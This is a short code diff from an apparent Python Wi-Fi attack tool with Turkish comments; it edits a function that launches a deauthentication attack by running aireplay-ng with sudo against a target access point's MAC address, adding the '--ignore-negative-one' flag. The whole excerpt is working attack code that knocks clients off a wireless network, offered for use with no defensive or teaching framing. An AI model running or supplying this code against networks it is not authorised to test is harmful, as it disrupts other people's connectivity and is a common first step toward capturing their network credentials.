@@ -66,7 +66,7 @@ def select_deauth_packet_count():
 # Deauthentication saldırısı başlatma
 def start_deauth_attack(target_mac, packet_count):
     print(f"[*] Starting deauthentication attack on {target_mac} with {packet_count} packets...")
-    subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon"])
+    subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon", "--ignore-negative-one"])
 
 # Ana fonksiyon - Akışı yönetme
 def main():
